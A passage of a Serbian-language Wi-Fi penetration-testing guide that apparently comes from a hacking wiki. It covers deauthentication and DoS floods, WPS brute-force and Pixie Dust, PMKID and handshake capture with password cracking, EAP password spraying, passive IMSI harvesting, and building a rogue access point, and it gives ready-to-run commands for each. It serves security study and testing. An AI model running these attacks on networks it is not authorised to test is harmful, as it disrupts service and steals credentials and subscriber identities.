# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Osnovne komande za Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Alati

### Hijacker & NexMon (interni Wi-Fi na Androidu)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Pokreni airgeddon pomoću Docker-a**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Izvor: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Može izvoditi Evil Twin, KARMA i Known Beacons napade, a zatim koristiti phishing template kako bi uspeo da dobije stvarnu lozinku mreže ili presretne social network credentials.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Ovaj alat automatizuje **WPS/WEP/WPA-PSK** napade. Automatski će:

- Podesiti interfejs u monitor mode
- Skenirati moguće mreže - i dozvoliti ti da izabereš žrtvu(e)
- Ako je WEP - pokrenuti WEP napade
- Ako je WPA-PSK
- Ako je WPS: Pixie dust attack i bruteforce attack (pazi, brute-force attack može potrajati dugo). Napomena: ne pokušava null PIN ili database/generated PINs.
- Pokušati da capture-uje PMKID sa AP-a radi crackanja
- Pokušati da deauth-uje klijente AP-a da bi capture-ovao handshake
- Ako PMKID ili Handshake, pokušati bruteforce koristeći top5000 passwords.

## Pregled napada

- **DoS**
- Deauthentication/disassociation -- Isključi sve (ili određeni ESSID/Client)
- Random fake APs -- Sakrij mreže, moguće sruši skenere
- Overload AP -- Pokušaj da onesposobiš AP (obično nije naročito koristan)
- WIDS -- Igraj se sa IDS-om
- TKIP, EAPOL -- Neki specifični napadi za DoS određenih AP-ova
- **Cracking**
- Crack **WEP** (više alata i metoda)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Koristan za capture captive portal creds i/ili izvođenje LAN napada
- **WPA-PSK** Evil Twin -- Koristan za mrežne napade ako znaš lozinku
- **WPA-MGT** -- Koristan za capture company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Koristan za capture captive portal creds i/ili izvođenje LAN napada
- **+ WPA** -- Koristan za capture WPA handshakes

## DOS

### Deauthentication Packets

**Opis od** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** napadi, raširena metoda u Wi-Fi hakovanju, uključuju falsifikovanje "management" frejmova kako bi **prisilno odvojili uređaje od mreže**. Ovi nešifrovani paketi obmanjuju klijente da pomisle da potiču od legitimne mreže, omogućavajući napadačima da prikupe WPA handshakes za potrebe crackinga ili da uporno remete mrežne veze. Ova taktika, zapanjujuća svojom jednostavnošću, široko je korišćena i ima značajne implikacije po sigurnost mreže.

**Deauthentication korišćenjem Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 znači deauthentication
- 1 je broj deauths koje treba poslati (možete poslati više ako želite); 0 znači da se šalju kontinuirano
- -a 00:14:6C:7E:40:80 je MAC adresa access point-a
- -c 00:0F:B5:34:30:30 je MAC adresa klijenta koji treba deauthenticate; ako je ovo izostavljeno onda se šalje broadcast deauthentication (ne radi uvek)
- ath0 je ime interfejsa

### Disassociation Packets

**Disassociation packets**, slični deauthentication packets, predstavljaju tip management frejma koji se koristi u Wi-Fi mrežama. Ovi paketi služe da prekinu vezu između uređaja (kao što su laptop ili smartphone) i access point-a (AP). Glavna razlika između disassociation i deauthentication leži u scenarijima njihove upotrebe. Dok AP emituje **deauthentication packets da eksplicitno ukloni rogue devices sa mreže, disassociation packets se obično šalju kada AP prolazi kroz gašenje**, restart ili preseljenje, čime je neophodno diskonektovati sve povezane čvorove.

**Ovaj napad se može izvesti pomoću mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Više DOS napada pomoću mdk4**

**U** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Šalje beacon frames da prikaže fake APs klijentima. Ovo ponekad može srušiti network scanners, pa čak i drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Slanje authentication frames svim dostupnim Access Points (APs) u dometu može preopteretiti ove AP-ove, posebno kada je uključen veliki broj klijenata. Ovaj intenzivan saobraćaj može dovesti do nestabilnosti sistema, uzrokujući da se neki AP-ovi zamrznu ili čak resetuju.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**REŽIM NAPADA p: SSID Probing and Bruteforcing**

Probing Access Points (APs) proverava da li je SSID pravilno prikazan i potvrđuje domet AP-a. Ova tehnika, u kombinaciji sa **bruteforcing hidden SSIDs** sa ili bez wordlist-a, pomaže u identifikaciji i pristupu sakrivenim mrežama.

**REŽIM NAPADA m: Michael Countermeasures Exploitation**

Slanje nasumičnih ili duplih paketa u različite QoS queues može pokrenuti Michael Countermeasures na **TKIP APs**, što dovodi do jednominutnog gašenja AP-a. Ova metoda je efikasna **DoS** (Denial of Service) taktika napada.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Preplavljivanje AP-a sa **EAPOL Start frames** stvara **lažne sesije**, preplavljujući AP i blokirajući legitimne klijente. Alternativno, ubrizgavanje **lažnih EAPOL Logoff messages** prisilno prekida vezu klijenata; obe metode efikasno ometaju mrežnu uslugu.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Napadi na mesh mreže IEEE 802.11s**

Različiti napadi na upravljanje linkovima i rutiranje u mesh mrežama.

**ATTACK MODE w: WIDS Confusion**

Prekrižno povezivanje klijenata sa više WDS čvorova ili lažnih rogue APs može manipulirati Intrusion Detection and Prevention Systems, stvarajući konfuziju i potencijalnu zloupotrebu sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Packet Fuzzer koji sadrži raznolike izvore paketa i sveobuhvatan skup modifikatora za manipulaciju paketima.

### **Airggedon**

_**Airgeddon**_ nudi većinu napada predloženih u prethodnim komentarima:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) pojednostavljuje proces povezivanja uređaja na ruter, ubrzavajući i olakšavajući konfiguraciju za mreže zaštićene enkripcijom **WPA** ili **WPA2** Personal. Neefikasan je protiv lako kompromitovane WEP zaštite. WPS koristi 8-cifreni PIN, koji se validira u dve polovine, što ga čini podložnim brute-force napadima zbog ograničenog broja kombinacija (oko 11.000 mogućnosti).

### WPS Bruteforce

Postoje 2 glavna alata za izvođenje ovog napada: Reaver i Bully.

- **Reaver** je dizajniran da bude robustan i praktičan alat za napad na WPS, i testiran je na velikom broju access point-a i WPS implementacija.
- **Bully** je **nova implementacija** WPS brute force napada, napisana u C. Ima nekoliko prednosti u odnosu na originalni reaver kod: manje zavisnosti, poboljšane performanse memorije i CPU, pravilno rukovanje endianness-om i robusniji skup opcija.

Napad iskorišćava ranjivost **WPS PIN-a**, naročito izlaganje prvih četiri cifre i ulogu poslednje cifre kao checksum-a, što olakšava brute-force napad. Međutim, odbrane protiv brute-force napada, kao što je **blokiranje MAC adresa** agresivnih napadača, zahtevaju **rotiranje MAC adresa** da bi se napad nastavio.

Nakon dobijanja WPS PIN-a alatima kao što su Bully ili Reaver, napadač može odrediti WPA/WPA2 PSK, obezbeđujući **perzistentan pristup mreži**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Ovaj rafinirani pristup cilja WPS PIN-ove koristeći poznate ranjivosti:

1. **Pre-discovered PINs**: Koristite bazu podataka poznatih PIN-ova povezanih sa određеним proizvođačima koji često koriste jednake WPS PIN-ove. Ova baza povezuje prva tri okteta MAC adresa sa verovatnim PIN-ovima za te proizvođače.
2. **PIN Generation Algorithms**: Iskoristite algoritme poput ComputePIN i EasyBox, koji izračunavaju WPS PIN-ove na osnovu MAC adrese AP-a. Arcadyan algoritam dodatno zahteva ID uređaja, što dodaje sloj u procesu generisanja PIN-a.

### WPS Pixie Dust attack

**Dominique Bongard** je otkrio propust u nekim Access Points (APs) vezan za kreiranje tajnih kodova, poznatih kao **nonces** (**E-S1** i **E-S2**). Ako se ovi nonces mogu otkriti, probijanje WPS PIN-a AP-a postaje jednostavno. AP otkriva PIN unutar posebnog koda (hash) kako bi dokazao da je legitimni, a ne lažni (rogue) AP. Ovi nonces su u suštini "ključevi" za otključavanje "sefa" koji sadrži WPS PIN. Više o tome možete pročitati [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Jednostavno rečeno, problem je što neki AP-ovi nisu koristili dovoljno nasumične ključeve za enkripciju PIN-a tokom procesa povezivanja. To čini PIN podložnim pogađanju izvan mreže (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Ako ne želite da prebacite uređaj u monitor mode, ili `reaver` i `bully` imaju neki problem, možete probati [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Ovaj alat može izvesti Pixie Dust attack bez potrebe da uređaj bude u monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Neki loše dizajnirani sistemi čak dozvoljavaju da **Null PIN** (prazan ili nepostojeći PIN) omogući pristup, što je prilično neuobičajeno. Alat **Reaver** je sposoban da testira ovu ranjivost, za razliku od **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Sve predložene WPS napade je lako izvesti koristeći _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 i 6 vam omogućavaju da isprobate **svoj prilagođeni PIN** (ako ga imate)
- 7 i 8 izvode **Pixie Dust attack**
- 13 vam omogućava da testirate **NULL PIN**
- 11 i 12 će **prikupiti PIN-ove povezane sa izabranim AP iz dostupnih baza podataka** i **generisati** moguće **PIN-ove** koristeći: ComputePIN, EasyBox i opciono Arcadyan (preporučeno, why not?)
- 9 i 10 će testirati **svaki mogući PIN**

## **WEP**

Tako kompromitovan i danas se retko koristi. Samo znajte da _**airgeddon**_ ima WEP opciju nazvanu "All-in-One" za napad na ovu vrstu zaštite. Više alata nudi slične opcije.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018. godine, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) novu metodu napada, jedinstvenu jer zahteva samo **jedan paket** i ne zahteva da bilo koji klijent bude povezan na ciljnu AP—samo interakciju između napadača i AP.

Mnogi moderni ruteri dodaju **opciono polje** u **prvi EAPOL** okvir tokom asociacije, poznato kao `Robust Security Network`. Ovo uključuje `PMKID`.

Kao što originalni post objašnjava, **PMKID** se kreira koristeći poznate podatke:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Pošto je "PMK Name" konstantan, znamo BSSID AP-a i station-a, i `PMK` je identičan onom iz full 4-way handshake-a, **hashcat** može iskoristiti ove informacije da crack the PSK i recover the passphrase!

Da biste **gather** ove informacije i lokalno **bruteforce** lozinku, možete uraditi:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** biće prikazani u **console** i takođe **sačuvani** u \_ **/tmp/attack.pcap**\_\
Sada pretvorite snimak u **hashcat/john** format i crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Imajte na umu da format ispravnog hasha sadrži **4 dela**, na primer: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Ako vaš **sadrži samo** **3 dela**, onda je **nevažeći** (PMKID capture nije bio validan).

Imajte na umu da `hcxdumptool` **takođe hvata handshakes** (pojaviće se nešto poput ovoga: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Možete **transformisati** **handshakes** u **hashcat**/**john** format koristeći `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Snimanje handshake-a

Napad na **WPA/WPA2** mreže može se izvesti hvatanjem **handshake** i pokušajem da se **crack**-uje password **offline**. Ovaj proces podrazumeva nadgledanje komunikacije određene mreže i **BSSID** na određenom **channel**. Evo pojednostavljenog vodiča:

1. Identifikujte **BSSID**, **channel** i **connected client** ciljne mreže.
2. Koristite `airodump-ng` za praćenje mrežnog saobraćaja na navedenom channel-u i BSSID-u, u nadi da ćete uhvatiti **handshake**. Komanda će izgledati ovako:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Da biste povećali šansu za hvatanje handshake-a, privremeno prekinite vezu client-a sa network-a kako biste primorali re-authentication. Ovo se može uraditi pomoću komande `aireplay-ng`, koja šalje deauthentication packets ka client-u:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Napomena: pošto je client bio deauthenticated, može pokušati da se poveže na drugi AP ili, u drugim slučajevima, na drugu network._

Kada se u `airodump-ng` pojave neki handshake podaci, to znači da je handshake uhvaćen i možete prestati sa slušanjem:

![](<../../images/image (172) (1).png>)

Kada je handshake uhvaćen, možete ga **crack**-ovati pomoću `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Proveri da li postoji handshake u fajlu

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Ako ovaj alat pronađe nekompletan handshake za ESSID pre nego što pronađe kompletan, neće otkriti važeći._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

U **enterprise WiFi okruženjima naići ćete na različite metode autentifikacije**, svaka pruža različite nivoe bezbednosti i mogućnosti upravljanja. Kada koristite alate kao što je `airodump-ng` za pregled mrežnog saobraćaja, možete primetiti identifikatore za ove tipove autentifikacije. Neki uobičajeni metodi uključuju:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ova metoda podržava hardware tokens i one-time passwords unutar EAP-PEAP. Za razliku od MSCHAPv2, ne koristi peer challenge i šalje lozinke u plaintextu pristupnoj tački, što predstavlja rizik od downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Podrazumeva slanje MD5 hasha lozinke od strane klijenta. **Nije preporučljivo** zbog ranjivosti na dictionary attacks, nedostatka server authentication i nemogućnosti generisanja session-specific WEP keys.
3. **EAP-TLS (Transport Layer Security)**:
- Koristi client-side i server-side certificates za autentifikaciju i može dinamički generisati user-based i session-based WEP keys za bezbednu komunikaciju.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Obezbeđuje mutual authentication kroz enkriptovani tunnel, zajedno sa metodom za izvođenje dinamičkih, per-user, per-session WEP keys. Zahteva samo server-side certificates, dok klijenti koriste credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funkcioniše slično EAP-u tako što kreira TLS tunnel za zaštićenu komunikaciju. Omogućava upotrebu slabijih authentication protocola iznad EAP zbog zaštite koju pruža tunnel.
- **PEAP-MSCHAPv2**: Često se naziva samo PEAP, kombinuje ranjiv MSCHAPv2 challenge/response mehanizam sa zaštitnim TLS tunnelom.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Slično EAP-TLS, ali inicira TLS tunnel pre razmene sertifikata, pružajući dodatni sloj bezbednosti.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Even using one of the most secure of authentication methods: **PEAP-EAP-TLS**, it is possible to **capture the username sent in the EAP protocol**. To do so, **capture a authentication communication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) and filter the packets by`eapol`.\
Inside the "**Response, Identity**" packet, the **username** of the client will appear.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding is supported by both EAP-PEAP and EAP-TTLS. In the context of a WiFi network, an EAP-Identity request is typically initiated by the access point (AP) during the association process. To ensure the protection of user anonymity, the response from the EAP client on the user's device contains only the essential information required for the initial RADIUS server to process the request. This concept is illustrated through the following scenarios:

- EAP-Identity = anonymous
- In this scenario, all users employ the pseudonymous "anonymous" as their user identifier. The initial RADIUS server functions as either an EAP-PEAP or EAP-TTLS server, responsible for managing the server-side of the PEAP or TTLS protocol. The inner (protected) authentication method is then either handled locally or delegated to a remote (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- In this situation, users from different realms conceal their identities while indicating their respective realms. This allows the initial RADIUS server to proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms, which act as the PEAP or TTLS server. The initial RADIUS server operates solely as a RADIUS relay node.
- Alternatively, the initial RADIUS server may function as the EAP-PEAP or EAP-TTLS server and either handle the protected authentication method or forward it to another server. This option facilitates the configuration of distinct policies for various realms.

In EAP-PEAP, once the TLS tunnel is established between the PEAP server and the PEAP client, the PEAP server initiates an EAP-Identity request and transmits it through the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user's true identity through the encrypted tunnel. This approach effectively prevents the revelation of the user's actual identity to anyone eavesdropping on the 802.11 traffic.

EAP-TTLS follows a slightly different procedure. With EAP-TTLS, the client typically authenticates using PAP or CHAP, secured by the TLS tunnel. In this case, the client includes a User-Name attribute and either a Password or CHAP-Password attribute in the initial TLS message sent after tunnel establishment.

Regardless of the protocol chosen, the PEAP/TTLS server obtains knowledge of the user's true identity after the TLS tunnel has been established. The true identity can be represented as user@realm or simply user. If the PEAP/TTLS server is also responsible for authenticating the user, it now possesses the user's identity and proceeds with the authentication method protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user's home RADIUS server. This new RADIUS request omits the PEAP or TTLS protocol layer. In cases where the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user's true identity, replacing the anonymous User-Name from the incoming RADIUS request. When the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes extracted from the TLS payload are substituted in the outgoing RADIUS message, displacing the anonymous User-Name and TTLS EAP-Message attributes found in the incoming RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leak (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Kliknite za prikaz</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Napomene:
- Radi pre bilo kog TLS tunela ako implementacija koristi gol EAP‑SIM/AKA bez zaštićenog identiteta/pseudonima.
- Izložena vrednost je trajni identifikator vezan za SIM pretplatnika; prikupljanje omogućava dugoročno praćenje i dalje zlopotrebe u telekomu.

Uticaj
- Privatnost: postojano praćenje korisnika/uređaja iz pasivnih Wi‑Fi snimaka na javnim mestima.
- Pokretanje zlopotrebe u telekomu: sa IMSI, napadač sa pristupom SS7/Diameter može upitom dobiti lokaciju ili pokušati presretanje poziva/SMS i krađu MFA.

Mitigacije / na šta obratiti pažnju
- Proverite da klijenti koriste anonimne spoljašnje identitete (pseudonime) za EAP‑SIM/AKA u skladu sa 3GPP smernicama (npr., 3GPP TS 33.402).
- Preporučuje se tunelovanje faze identiteta (npr., EAP‑TTLS/PEAP koji nosi unutrašnji EAP‑SIM/AKA) tako da IMSI nikada nije poslat u čistom obliku.
- Snimci paketa asocijacije/autentikacije nikada ne bi smeli otkriti sirovi IMSI u EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **korisničko ime i lozinku** (napomena da **EAP-TLS neće biti validan** u ovom slučaju), onda možete pokušati da dobijete **listu** **korisničkih imena** (pogledajte sledeći deo) i **lozinki** i pokušate da **bruteforce** pristup koristeći [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Ovaj napad takođe možete izvesti koristeći `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teorija napada na klijente

### Odabir mreže i roaming

- Protokol 802.11 definiše kako stanica pristupa Extended Service Set (ESS), ali ne specificira kriterijume za izbor ESS ili pristupne tačke (AP) unutar njega.
- Stanice mogu prelaziti između AP-ova koji dele isti ESSID, održavajući konekciju kroz zgradu ili područje.
- Protokol zahteva autentifikaciju stanice prema ESS, ali ne nalaže autentifikaciju AP-a prema stanici.

### Liste preferiranih mreža (PNLs)

- Stanice čuvaju ESSID svake bežične mreže na koju se povezuju u svojoj Preferred Network List (PNL), zajedno sa konfiguracionim detaljima specifičnim za tu mrežu.
- PNL se koristi za automatsko povezivanje na poznate mreže, poboljšavajući iskustvo korisnika tako što pojednostavljuje proces povezivanja.

### Pasivno skeniranje

- AP-ovi periodično šalju beacon frames, najavljujući svoje prisustvo i karakteristike, uključujući ESSID AP-a osim ako emitovanje nije onemogućeno.
- Tokom pasivnog skeniranja stanice osluškuju beacon frames. Ako ESSID u beaconu odgovara stavci u PNL stanice, stanica se može automatski povezati na taj AP.
- Poznavanje PNL uređaja omogućava potencijalnu eksploataciju imitiranjem ESSID-a poznate mreže, varajući uređaj da se poveže na zlonamerni (rogue) AP.

### Aktivno ispitivanje

- Aktivno ispitivanje uključuje stanice koje šalju probe requests da otkriju obližnje AP-ove i njihove karakteristike.
- Direktne probe requests ciljaju određeni ESSID, pomažući da se detektuje da li je konkretna mreža u dometu, čak i ako je skrivena.
- Broadcast probe requests imaju polje SSID postavljeno na null i šalju se svim obližnjim AP-ovima, omogućavajući stanici da proveri bilo koju preferiranu mrežu bez otkrivanja sadržaja svog PNL-a.

## Jednostavan AP sa preusmeravanjem na Internet

Pre nego što objasnimo kako izvesti složenije napade, biće objašnjeno **kako** samo **kreirati** **AP** i **preusmeriti** njegov **saobraćaj** na interfejs povezan sa **Internet**.

Korišćenjem `ifconfig -a` proverite da li su wlan interfejs koji će se koristiti za kreiranje AP-a i interfejs povezan na Internet prisutni.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Kreirajte konfiguracioni fajl `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Zatim **set IPs** i **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Zatim **pokrenite** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Kreirajte konfiguracioni fajl `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zaustavite dosadne procese** , postavite **monitor mode**, i pokrenite **hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Prosleđivanje i preusmeravanje
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack iskorišćava način na koji WiFi klijenti prepoznaju mreže, prvenstveno oslanjajući se na naziv mreže (ESSID) bez zahteva da base station (access point) autentifikuje sebe prema klijentu. Ključne tačke uključuju:

- **Teškoće u razlikovanju**: Uređaji imaju problema da razlikuju legitiman i rogue access points kada dele isti ESSID i tip enkripcije. Mreže u stvarnom svetu često koriste više access points sa istim ESSID-om da bi neprimetno proširile pokrivenost.
